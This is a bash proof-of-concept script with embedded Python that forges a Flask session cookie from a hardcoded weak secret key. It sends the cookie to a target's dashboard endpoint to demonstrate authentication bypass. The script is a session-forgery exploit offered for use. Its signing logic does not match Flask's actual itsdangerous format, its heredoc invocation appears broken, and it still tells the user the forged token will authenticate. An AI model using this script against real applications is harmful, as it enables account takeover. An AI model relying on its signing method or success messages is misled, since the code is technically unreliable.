#!/bin/bash
# POC: Forge Flask Session Token with Weak Secret Key
# Demonstrates authentication bypass by forging a valid session cookie
# using the hardcoded secret key 'your_secret_key'

TARGET_URL="${1:-http://localhost:5000}"
USER_ID="${2:-1}"

echo "[*] Flask Session Secret Key Forging POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Forging session for user_id: $USER_ID"
echo ""

# Flask uses itsdangerous to sign session cookies
# Session data is JSON encoded, then signed with HMAC-SHA1
# Cookie format: payload.signature

# Create a Python script to forge the session token
PYTHON_CODE=$(cat <<'EOF'
import sys
import json
import hashlib
import hmac
import base64
import urllib.parse
from datetime import datetime, timedelta

target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
user_id = sys.argv[2] if len(sys.argv) > 2 else "1"
secret_key = "your_secret_key"  # Hardcoded weak secret from app/__init__.py

print("[*] Using hardcoded secret key: 'your_secret_key'")
print("[*] Forging session for user_id:", user_id)
print("")

# Flask session data structure
session_data = {
    'user_id': int(user_id)
}

print("[*] Session data to forge:", session_data)

# Flask uses itsdangerous.URLSafeTimedSerializer
# We need to construct a valid signed session token

# Simplified: Create a JSON payload and sign it
payload = json.dumps(session_data)
print("[*] Payload:", payload)

# Sign with HMAC-SHA1 using the secret key
signature = hmac.new(
    secret_key.encode(),
    payload.encode(),
    hashlib.sha1
).digest()

# Base64 encode the signature
sig_b64 = base64.b64encode(signature).decode().rstrip('=')
payload_b64 = base64.b64encode(payload.encode()).decode().rstrip('=')

# Flask session token format
session_token = payload_b64 + '.' + sig_b64

print("[*] Forged session token:", session_token)
print("")

# Test the forged token by making a request
import urllib.request
import urllib.error

print("[*] Testing forged session token on target...")
print("")

# Try to access a protected endpoint with the forged cookie
try:
    req = urllib.request.Request(
        target_url + '/dashboard',
        headers={
            'Cookie': f'session={session_token}'
        }
    )
    response = urllib.request.urlopen(req)
    content = response.read().decode()
    
    print("[+] SUCCESS: Request with forged session succeeded!")
    print("[+] Status Code:", response.status)
    print("[+] Response length:", len(content))
    
    # Check if we got past authentication
    if 'dashboard' in content.lower() or 'user' in content.lower():
        print("[+] Response contains dashboard/user content - Authentication bypass confirmed!")
    
except urllib.error.HTTPError as e:
    print("[-] HTTP Error:", e.code)
    content = e.read().decode()
    
    # 401/403 means authentication failed (good - session not forged correctly)
    # Other responses might indicate we bypassed auth
    if e.code == 302:
        print("[+] Got redirect - checking location...")
        print("[+] Redirect target:", e.headers.get('Location'))
    elif e.code == 200:
        print("[+] Got 200 OK - possible authentication bypass")
        print("[+] Response preview:", content[:200])
    else:
        print("[-] Authentication failed with status:", e.code)
        
except Exception as e:
    print("[-] Error testing forged token:", str(e))
    print("[*] This is expected if the app is not running")
    print("[*] The POC successfully generated a forged session token:")
    print("[*] Token:", session_token)
    print("[*] This token can be used to authenticate as user_id:", user_id)

print("")
print("[*] POC Complete")
print("[*] Use the forged session token above in a Cookie header to authenticate as user:", user_id)
EOF
)

# Execute the Python code
python3 << PYTHON_EXEC
$PYTHON_CODE "$TARGET_URL" "$USER_ID"
PYTHON_EXEC

exit 0